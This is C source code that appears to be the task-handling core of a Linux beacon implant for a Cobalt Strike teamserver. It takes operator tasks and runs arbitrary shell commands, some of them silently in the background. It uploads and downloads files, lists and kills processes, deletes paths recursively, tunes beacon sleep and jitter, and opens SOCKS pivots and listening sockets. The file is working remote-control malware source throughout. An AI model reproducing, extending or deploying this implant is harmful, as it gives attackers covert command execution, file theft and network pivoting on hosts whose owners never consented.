#include "commands.h"
#include "beacon.h"
#include "files.h"
#include "pivot.h"
#include "parse.h"
#include "debug.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <limits.h>
#include <ctype.h>
#include <pwd.h>
#include <grp.h>
#include <signal.h>

extern unsigned int sleep_time;
extern unsigned int jitter;

/* Text output — never use CALLBACK_ERROR with free-form strings.
 * Teamserver treats CALLBACK_ERROR as structured ints (see BeaconErrors.java);
 * plain text becomes garbage like "Unknown error: 1315905651". */
static void cb_output(const char *s, int len) {
    if (!s) {
        s = "";
        len = 0;
    }
    if (len < 0) len = (int)strlen(s);
    command_shell_callback((char *)s, len, CALLBACK_OUTPUT_UTF8);
}

static void cb_output_z(const char *s) {
    cb_output(s, s ? (int)strlen(s) : 0);
}

static void command_die(void) {
    sleep_time = 0;
    command_shell_callback(NULL, 0, CALLBACK_DEAD);
}

static void command_sleep(char *buffer, int length) {
    datap p;
    if (sleep_time == 0) return;
    data_init(&p, buffer, length);
    sleep_time = data_int(&p);
    jitter = data_int(&p);
    if (jitter > 99) jitter = 0;
    DEBUG_PRINT("[cmd] sleep=%u jitter=%u\n", sleep_time, jitter);
}

static void command_cd(char *buffer, int length) {
    char path[PATH_MAX];
    if (length <= 0 || length >= (int)sizeof(path)) {
        cb_output_z("cd: path too long");
        return;
    }
    memcpy(path, buffer, (size_t)length);
    path[length] = 0;
    /* strip trailing NUL if present */
    if (length > 0 && path[length - 1] == '\0')
        ; /* already terminated */
    if (chdir(path) != 0) {
        char msg[PATH_MAX + 64];
        snprintf(msg, sizeof(msg), "cd failed: %s (%s)", path, strerror(errno));
        cb_output_z(msg);
    }
}

static void command_pwd(void) {
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd))) {
        /* CALLBACK_PWD updates UI path; also emit UTF8 so console always shows it */
        command_shell_callback(cwd, (int)strlen(cwd), CALLBACK_PWD);
        cb_output_z(cwd);
    } else {
        cb_output_z("pwd failed");
    }
}

/*
 * EXECUTE_JOB (78) from TaskBeacon.Shell for beacon sessions:
 *   [4 BE] len(comspec)  [N] comspec   e.g. "%COMSPEC%"
 *   [4 BE] len(args)     [N] args      e.g. " /C id"
 *   [2 BE] flags         e.g. 0
 *
 * On Linux we ignore Windows COMSPEC and run: /bin/sh -c "<cmd>"
 * where <cmd> is args with a leading " /C " stripped if present.
 */
static void command_execute_job(char *buffer, int length) {
    datap p;
    unsigned int l1, l2;
    char *comspec, *args;
    char cmd[8192];
    const char *run;
    FILE *fp;
    char line[1024];
    char *out = NULL;
    size_t out_len = 0;
    char *nbuf;

    if (length < 8) {
        cb_output_z("shell: task too short");
        return;
    }

    data_init(&p, buffer, length);
    l1 = data_int(&p);
    comspec = data_ptr(&p, (int)l1);
    l2 = data_int(&p);
    args = data_ptr(&p, (int)l2);
    /* trailing short flags optional */
    (void)comspec;

    if (!args || l2 == 0 || l2 >= sizeof(cmd)) {
        cb_output_z("shell: invalid args");
        return;
    }
    memcpy(cmd, args, l2);
    cmd[l2] = 0;

    run = cmd;
    /* strip " /C " or "/C " prefix from Windows packaging */
    if (strncmp(run, " /C ", 4) == 0)
        run += 4;
    else if (strncmp(run, "/C ", 3) == 0)
        run += 3;
    else if (strncmp(run, " /c ", 4) == 0)
        run += 4;

    DEBUG_PRINT("[shell] run: '%s'\n", run);

    /* popen() invokes /bin/sh -c <string> on Linux */
    fp = popen(run, "r");
    if (!fp) {
        char msg[256];
        snprintf(msg, sizeof(msg), "shell: popen failed: %s", strerror(errno));
        cb_output_z(msg);
        return;
    }
    while (fgets(line, sizeof(line), fp)) {
        size_t n = strlen(line);
        nbuf = realloc(out, out_len + n + 1);
        if (!nbuf) break;
        out = nbuf;
        memcpy(out + out_len, line, n);
        out_len += n;
        out[out_len] = 0;
    }
    pclose(fp);

    if (out && out_len > 0) {
        command_shell_callback(out, (int)out_len, CALLBACK_OUTPUT_UTF8);
        free(out);
    } else {
        /* Always return something so operator sees completion */
        cb_output_z("(no output)");
        free(out);
    }
}

/*
 * FILE_LIST (53) — TaskBeaconCallback.Ls / filesys.cpp
 *
 * Task (console ls uses reqid = -2 via task_ls_default):
 *   [4 BE] reqid
 *   [4 BE] path_len
 *   [N]    path + "\\*"   e.g. ".\\*"  or  "/tmp\\*"
 *
 * Callback type 22 (CALLBACK_PENDING):
 *   [4 BE] reqid   (-2 for console ls)
 *   path\\*\n
 *   D\t0\tMM/DD/YYYY HH:MM:SS\tname\n   (include . and .. !)
 *   F\tsize\tMM/DD/YYYY HH:MM:SS\tname\n
 *
 * Teamserver process_beacon_callback_default(-2):
 *   split by \n; if lines < 3 → SILENT DROP (no console output).
 * Official Windows listing always has path + . + .. (>= 3 lines).
 */
static void normalize_ls_path(char *path, size_t max) {
    size_t n;
    char *p;
    for (p = path; *p; p++) {
        if (*p == '\\') *p = '/';
    }
    n = strlen(path);
    while (n > 0 && (path[n - 1] == '*' || path[n - 1] == '/' || path[n - 1] == ' '))
        path[--n] = '\0';
    if (n == 0 || strcmp(path, ".") == 0) {
        if (!getcwd(path, max)) {
            path[0] = '.';
            path[1] = 0;
        }
    }
}

static int append_bytes(char **out, size_t *out_len, size_t *cap, const void *data, size_t n) {
    if (*out_len + n + 1 > *cap) {
        size_t nc = (*out_len + n) * 2 + 4096;
        char *tmp = realloc(*out, nc);
        if (!tmp) return -1;
        *out = tmp;
        *cap = nc;
    }
    memcpy(*out + *out_len, data, n);
    *out_len += n;
    return 0;
}

static void command_file_list(char *buffer, int length) {
    datap p;
    unsigned int reqid, path_len;
    char *path_raw;
    char dirpath[PATH_MAX];
    char display[PATH_MAX + 4];
    char header[PATH_MAX + 8];
    DIR *d;
    struct dirent *de;
    char *out = NULL;
    size_t out_len = 0, cap = 0;
    uint32_t req_be;
    int n;
    int lines = 0;

    if (length < 8) {
        cb_output_z("ls: task too short");
        return;
    }

    data_init(&p, buffer, length);
    reqid = data_int(&p); /* console ls: -2 (0xFFFFFFFE) */
    path_len = data_int(&p);
    path_raw = data_ptr(&p, (int)path_len);
    if (!path_raw || path_len == 0 || path_len >= sizeof(dirpath)) {
        cb_output_z("ls: bad path");
        return;
    }
    memcpy(dirpath, path_raw, path_len);
    dirpath[path_len] = 0;
    normalize_ls_path(dirpath, sizeof(dirpath));

    /* Windows-style header path\* (teamserver OutputLS expects this shape) */
    snprintf(display, sizeof(display), "%s\\*", dirpath);

    DEBUG_PRINT("[ls] reqid=%d path='%s'\n", (int)reqid, dirpath);

    cap = 8192;
    out = malloc(cap);
    if (!out) return;
    req_be = htonl(reqid);
    memcpy(out, &req_be, 4);
    out_len = 4;

    n = snprintf(header, sizeof(header), "%s\n", display);
    if (n > 0) {
        append_bytes(&out, &out_len, &cap, header, (size_t)n);
        lines = 1;
    }

    d = opendir(dirpath);
    if (!d) {
        append_bytes(&out, &out_len, &cap, "D\t0\t01/01/1970 00:00:00\t.\n", 26);
        append_bytes(&out, &out_len, &cap, "D\t0\t01/01/1970 00:00:00\t..\n", 27);
        command_shell_callback(out, (int)out_len, CALLBACK_PENDING);
        free(out);
        {
            char msg[PATH_MAX + 64];
            snprintf(msg, sizeof(msg), "ls failed: %s", strerror(errno));
            cb_output_z(msg);
        }
        return;
    }

    while ((de = readdir(d)) != NULL) {
        char full[PATH_MAX];
        char line[PATH_MAX + 128];
        struct stat st;
        struct tm tm;
        int is_dir = 0;
        long long fsize = 0;
        int ln;

        /* Keep . and .. — need >= 3 lines total for reqid -2 */
        snprintf(full, sizeof(full), "%s/%s", dirpath, de->d_name);
        if (lstat(full, &st) == 0) {
            is_dir = S_ISDIR(st.st_mode);
            fsize = (long long)st.st_size;
            localtime_r(&st.st_mtime, &tm);
        } else {
            memset(&tm, 0, sizeof(tm));
            if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                is_dir = 1;
        }

        if (is_dir) {
            ln = snprintf(line, sizeof(line),
                          "D\t0\t%02d/%02d/%04d %02d:%02d:%02d\t%s\n",
                          tm.tm_mon + 1, tm.tm_mday, tm.tm_year + 1900,
                          tm.tm_hour, tm.tm_min, tm.tm_sec, de->d_name);
        } else {
            ln = snprintf(line, sizeof(line),
                          "F\t%lld\t%02d/%02d/%04d %02d:%02d:%02d\t%s\n",
                          fsize,
                          tm.tm_mon + 1, tm.tm_mday, tm.tm_year + 1900,
                          tm.tm_hour, tm.tm_min, tm.tm_sec, de->d_name);
        }
        if (ln <= 0) continue;
        if (append_bytes(&out, &out_len, &cap, line, (size_t)ln) != 0)
            break;
        lines++;
    }
    closedir(d);

    while (lines < 3) {
        const char *pad = (lines == 1)
            ? "D\t0\t01/01/1970 00:00:00\t.\n"
            : "D\t0\t01/01/1970 00:00:00\t..\n";
        append_bytes(&out, &out_len, &cap, pad, strlen(pad));
        lines++;
    }

    DEBUG_PRINT("[ls] PENDING bytes=%zu lines=%d\n", out_len, lines);
    command_shell_callback(out, (int)out_len, CALLBACK_PENDING);
    free(out);
}

static void path_from_buffer(char *dst, size_t dstsz, char *buffer, int length) {
    size_t n = (size_t)length;
    size_t i;
    if (n >= dstsz) n = dstsz - 1;
    memcpy(dst, buffer, n);
    dst[n] = 0;
    /* strip trailing NULs */
    while (n > 0 && dst[n - 1] == '\0') {
        dst[--n] = 0;
    }
    for (i = 0; dst[i]; i++) {
        if (dst[i] == '\\') dst[i] = '/';
    }
}

/* length-prefixed path (data_string): [4 BE len][bytes] optional extra */
static int path_from_lenstr(datap *p, char *dst, size_t dstsz) {
    unsigned int n;
    char *s;
    size_t i;
    n = data_int(p);
    if (n == 0 || n >= dstsz) return -1;
    s = data_ptr(p, (int)n);
    if (!s) return -1;
    memcpy(dst, s, n);
    dst[n] = 0;
    while (n > 0 && dst[n - 1] == '\0') dst[--n] = 0;
    for (i = 0; dst[i]; i++) {
        if (dst[i] == '\\') dst[i] = '/';
    }
    return 0;
}

static void command_upload(char *buffer, int length, const char *mode) {
    datap p;
    unsigned int name_len;
    char *name;
    char path[PATH_MAX];
    FILE *f;
    char *data;
    int data_len;
    size_t i;

    if (length < 4) {
        cb_output_z("upload: short task");
        return;
    }
    data_init(&p, buffer, length);
    name_len = data_int(&p);
    name = data_ptr(&p, (int)name_len);
    if (!name || name_len == 0 || name_len >= sizeof(path)) {
        cb_output_z("upload: bad name");
        return;
    }
    memcpy(path, name, name_len);
    path[name_len] = 0;
    for (i = 0; path[i]; i++) {
        if (path[i] == '\\') path[i] = '/';
    }
    data = data_buffer(&p);
    data_len = data_length(&p);

    f = fopen(path, mode);
    if (!f) {
        char msg[PATH_MAX + 64];
        snprintf(msg, sizeof(msg), "upload open failed: %s", strerror(errno));
        cb_output_z(msg);
        return;
    }
    if (data_len > 0 && data)
        fwrite(data, 1, (size_t)data_len, f);
    fclose(f);
}

static void command_download(char *buffer, int length) {
    char path[PATH_MAX];
    if (length <= 0) {
        cb_output_z("download: empty path");
        return;
    }
    path_from_buffer(path, sizeof(path), buffer, length);
    if (!path[0]) {
        cb_output_z("download: empty path");
        return;
    }
    DEBUG_PRINT("[download] path='%s'\n", path);
    files_download_start(path);
}

static void command_download_stop(char *buffer, int length) {
    files_download_stop((const uint8_t *)buffer, (size_t)length);
}

static void command_mkdir(char *buffer, int length) {
    char path[PATH_MAX];
    datap p;
    if (length < 4) {
        path_from_buffer(path, sizeof(path), buffer, length);
    } else {
        data_init(&p, buffer, length);
        if (path_from_lenstr(&p, path, sizeof(path)) != 0)
            path_from_buffer(path, sizeof(path), buffer, length);
    }
    if (!path[0]) {
        cb_output_z("mkdir: empty path");
        return;
    }
    if (mkdir(path, 0755) != 0) {
        char msg[PATH_MAX + 64];
        snprintf(msg, sizeof(msg), "mkdir failed: %s (%s)", path, strerror(errno));
        cb_output_z(msg);
        return;
    }
    {
        char msg[PATH_MAX + 32];
        snprintf(msg, sizeof(msg), "created directory %s", path);
        cb_output_z(msg);
    }
}

static int rm_path(const char *path) {
    struct stat st;
    if (lstat(path, &st) != 0) return -1;
    if (S_ISDIR(st.st_mode)) {
        DIR *d = opendir(path);
        struct dirent *de;
        char child[PATH_MAX];
        if (!d) return -1;
        while ((de = readdir(d)) != NULL) {
            if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                continue;
            snprintf(child, sizeof(child), "%s/%s", path, de->d_name);
            if (rm_path(child) != 0) {
                closedir(d);
                return -1;
            }
        }
        closedir(d);
        return rmdir(path);
    }
    return unlink(path);
}

static void command_rm(char *buffer, int length) {
    char path[PATH_MAX];
    datap p;
    if (length >= 4) {
        data_init(&p, buffer, length);
        if (path_from_lenstr(&p, path, sizeof(path)) != 0)
            path_from_buffer(path, sizeof(path), buffer, length);
    } else {
        path_from_buffer(path, sizeof(path), buffer, length);
    }
    if (!path[0]) {
        cb_output_z("rm: empty path");
        return;
    }
    if (rm_path(path) != 0) {
        char msg[PATH_MAX + 64];
        snprintf(msg, sizeof(msg), "rm failed: %s (%s)", path, strerror(errno));
        cb_output_z(msg);
        return;
    }
    {
        char msg[PATH_MAX + 32];
        snprintf(msg, sizeof(msg), "removed %s", path);
        cb_output_z(msg);
    }
}

static void command_cp_or_mv(char *buffer, int length, int is_move) {
    datap p;
    char src[PATH_MAX], dst[PATH_MAX];
    FILE *in, *out;
    char buf[8192];
    size_t n;

    data_init(&p, buffer, length);
    if (path_from_lenstr(&p, src, sizeof(src)) != 0 ||
        path_from_lenstr(&p, dst, sizeof(dst)) != 0) {
        cb_output_z(is_move ? "mv: bad args" : "cp: bad args");
        return;
    }
    if (is_move) {
        if (rename(src, dst) == 0) {
            char msg[PATH_MAX * 2 + 32];
            snprintf(msg, sizeof(msg), "moved %s -> %s", src, dst);
            cb_output_z(msg);
            return;
        }
        /* fall through to copy+unlink if cross-device */
    }
    in = fopen(src, "rb");
    if (!in) {
        cb_output_z("copy: open source failed");
        return;
    }
    out = fopen(dst, "wb");
    if (!out) {
        fclose(in);
        cb_output_z("copy: open dest failed");
        return;
    }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            cb_output_z("copy: write failed");
            return;
        }
    }
    fclose(in);
    fclose(out);
    if (is_move) unlink(src);
    {
        char msg[PATH_MAX * 2 + 32];
        snprintf(msg, sizeof(msg), "%s %s -> %s", is_move ? "moved" : "copied", src, dst);
        cb_output_z(msg);
    }
}

/* PS_LIST (32): [4 BE] reqid optional. Callback PENDING with process table text.
 * Console "ps" uses similar pending path; emit UTF8 table for reliability. */
static void command_ps_list(char *buffer, int length) {
    DIR *d;
    struct dirent *de;
    char *out = NULL;
    size_t out_len = 0, cap = 0;
    char line[512];
    int n;
    (void)buffer;
    (void)length;

    cap = 8192;
    out = malloc(cap);
    if (!out) return;
    n = snprintf(line, sizeof(line), "PID\tPPID\tUSER\tNAME\n");
    append_bytes(&out, &out_len, &cap, line, (size_t)n);

    d = opendir("/proc");
    if (!d) {
        cb_output_z("ps: cannot open /proc");
        free(out);
        return;
    }
    while ((de = readdir(d)) != NULL) {
        char *end = NULL;
        long pid;
        char statpath[64], cmdpath[64], comm[256], status_path[64];
        FILE *sf;
        int ppid = 0;
        char user[64] = "?";
        struct stat st;

        if (!isdigit((unsigned char)de->d_name[0])) continue;
        pid = strtol(de->d_name, &end, 10);
        if (!end || *end) continue;

        snprintf(cmdpath, sizeof(cmdpath), "/proc/%ld/comm", pid);
        sf = fopen(cmdpath, "r");
        if (sf) {
            if (fgets(comm, sizeof(comm), sf)) {
                size_t cl = strlen(comm);
                while (cl > 0 && (comm[cl - 1] == '\n' || comm[cl - 1] == '\r'))
                    comm[--cl] = 0;
            } else {
                snprintf(comm, sizeof(comm), "?");
            }
            fclose(sf);
        } else {
            snprintf(comm, sizeof(comm), "?");
        }

        snprintf(statpath, sizeof(statpath), "/proc/%ld/stat", pid);
        sf = fopen(statpath, "r");
        if (sf) {
            /* pid (comm) state ppid ... */
            int dummy;
            char state;
            if (fscanf(sf, "%d %*s %c %d", &dummy, &state, &ppid) < 3)
                ppid = 0;
            fclose(sf);
        }

        snprintf(status_path, sizeof(status_path), "/proc/%ld", pid);
        if (stat(status_path, &st) == 0) {
            struct passwd *pw = getpwuid(st.st_uid);
            if (pw && pw->pw_name)
                snprintf(user, sizeof(user), "%s", pw->pw_name);
            else
                snprintf(user, sizeof(user), "%u", (unsigned)st.st_uid);
        }

        n = snprintf(line, sizeof(line), "%ld\t%d\t%s\t%s\n", pid, ppid, user, comm);
        if (n > 0) append_bytes(&out, &out_len, &cap, line, (size_t)n);
    }
    closedir(d);
    command_shell_callback(out, (int)out_len, CALLBACK_OUTPUT_UTF8);
    free(out);
}

static void command_ps_kill(char *buffer, int length) {
    datap p;
    unsigned int pid;
    if (length < 4) {
        cb_output_z("kill: short task");
        return;
    }
    data_init(&p, buffer, length);
    pid = data_int(&p);
    if (kill((pid_t)pid, SIGKILL) != 0) {
        char msg[128];
        snprintf(msg, sizeof(msg), "kill %u failed: %s", pid, strerror(errno));
        cb_output_z(msg);
        return;
    }
    {
        char msg[64];
        snprintf(msg, sizeof(msg), "killed %u", pid);
        cb_output_z(msg);
    }
}

static void command_setenv(char *buffer, int length) {
    /* format often: NAME=value as raw string or length-prefixed */
    char env[4096];
    char *eq;
    if (length <= 0 || length >= (int)sizeof(env)) {
        cb_output_z("setenv: bad length");
        return;
    }
    memcpy(env, buffer, (size_t)length);
    env[length] = 0;
    eq = strchr(env, '=');
    if (!eq) {
        cb_output_z("setenv: expected NAME=value");
        return;
    }
    *eq = 0;
    if (setenv(env, eq + 1, 1) != 0) {
        cb_output_z("setenv failed");
        return;
    }
    cb_output_z("setenv ok");
}

static void command_getuid(void) {
    char msg[256];
    struct passwd *pw = getpwuid(geteuid());
    snprintf(msg, sizeof(msg), "uid=%u(%s) euid=%u gid=%u",
             (unsigned)getuid(),
             pw && pw->pw_name ? pw->pw_name : "?",
             (unsigned)geteuid(),
             (unsigned)getgid());
    cb_output_z(msg);
}

static void command_jobs(void) {
    /* Minimal: no job table yet */
    cb_output_z("Jobs\n====\n(no jobs)\n");
}

static void command_execute_silent(char *buffer, int length) {
    char cmd[8192];
    pid_t pid;
    if (length <= 0 || length >= (int)sizeof(cmd)) return;
    memcpy(cmd, buffer, (size_t)length);
    cmd[length] = 0;
    pid = fork();
    if (pid == 0) {
        int fd = open("/dev/null", O_RDWR);
        if (fd >= 0) {
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            if (fd > 2) close(fd);
        }
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
}

/* COMMAND_SHELL (2) — SSH/session style: raw command string */
static void command_shell_raw(char *buffer, int length) {
    char cmd[8192];
    if (length <= 0 || length >= (int)sizeof(cmd)) {
        cb_output_z("shell: bad length");
        return;
    }
    memcpy(cmd, buffer, (size_t)length);
    cmd[length] = 0;
    /* reuse job path by fabricating EXECUTE_JOB-like via popen */
    {
        FILE *fp = popen(cmd, "r");
        char line[1024];
        char *out = NULL;
        size_t out_len = 0;
        if (!fp) {
            cb_output_z("shell: popen failed");
            return;
        }
        while (fgets(line, sizeof(line), fp)) {
            size_t n = strlen(line);
            char *tmp = realloc(out, out_len + n + 1);
            if (!tmp) break;
            out = tmp;
            memcpy(out + out_len, line, n);
            out_len += n;
            out[out_len] = 0;
        }
        pclose(fp);
        if (out && out_len)
            command_shell_callback(out, (int)out_len, CALLBACK_OUTPUT_UTF8);
        else
            cb_output_z("(no output)");
        free(out);
    }
}

void process_message(unsigned int type, char *buffer, int length) {
    DEBUG_PRINT("[proto] cmd=%u len=%d\n", type, length);
    switch (type) {
    case COMMAND_DIE:
        command_die();
        break;
    case COMMAND_SLEEP:
        command_sleep(buffer, length);
        break;
    case COMMAND_CD:
        command_cd(buffer, length);
        break;
    case COMMAND_PWD:
        command_pwd();
        break;
    case COMMAND_SHELL: /* 2 — session style */
        command_shell_raw(buffer, length);
        break;
    case COMMAND_EXECUTE: /* 12 — fire and forget */
        command_execute_silent(buffer, length);
        break;
    case COMMAND_EXECUTE_JOB: /* 78 — beacon shell with output */
        command_execute_job(buffer, length);
        break;
    case COMMAND_FILE_LIST:
        command_file_list(buffer, length);
        break;
    case COMMAND_FILE_MKDIR:
        command_mkdir(buffer, length);
        break;
    case COMMAND_FILE_RM:
        command_rm(buffer, length);
        break;
    case COMMAND_FILE_COPY:
        command_cp_or_mv(buffer, length, 0);
        break;
    case COMMAND_FILE_MOVE:
        command_cp_or_mv(buffer, length, 1);
        break;
    case COMMAND_UPLOAD:
        command_upload(buffer, length, "wb");
        break;
    case COMMAND_UPLOAD_CONTINUE:
        command_upload(buffer, length, "ab");
        break;
    case COMMAND_DOWNLOAD:
        command_download(buffer, length);
        break;
    case COMMAND_DOWNLOAD_STOP:
        command_download_stop(buffer, length);
        break;
    case COMMAND_CONNECT:
        command_connect_socks((const uint8_t *)buffer, length, (pivot_callback)command_shell_callback);
        break;
    case COMMAND_SEND:
        command_send_socks((const uint8_t *)buffer, length);
        break;
    case COMMAND_CLOSE:
        command_close_socks((const uint8_t *)buffer, length);
        break;
    case COMMAND_LISTEN:
        command_listen_socks((const uint8_t *)buffer, length, (pivot_callback)command_shell_callback);
        break;
    case COMMAND_LSOCKET_BIND:
        command_socket_bind((const uint8_t *)buffer, length, INADDR_ANY);
        break;
    case COMMAND_LSOCKET_BIND_LOCALHOST:
        command_socket_bind((const uint8_t *)buffer, length, htonl(INADDR_LOOPBACK));
        break;
    case COMMAND_LSOCKET_CLOSE:
        command_socket_close_port((const uint8_t *)buffer, length);
        break;
    case COMMAND_PS_LIST:
        command_ps_list(buffer, length);
        break;
    case COMMAND_PS_KILL:
        command_ps_kill(buffer, length);
        break;
    case COMMAND_SETENV:
        command_setenv(buffer, length);
        break;
    case COMMAND_TOKEN_GETUID:
        command_getuid();
        break;
    case COMMAND_JOBS:
        command_jobs();
        break;
    case COMMAND_JOB_KILL:
        cb_output_z("jobkill: no jobs running");
        break;
    case COMMAND_CHECKIN:
        /* no-op: next loop already checkins */
        break;
    default: {
        char msg[128];
        snprintf(msg, sizeof(msg), "unsupported command id %u (0x%x)", type, type);
        DEBUG_PRINT("[proto] %s\n", msg);
        cb_output_z(msg);
        break;
    }
    }
}
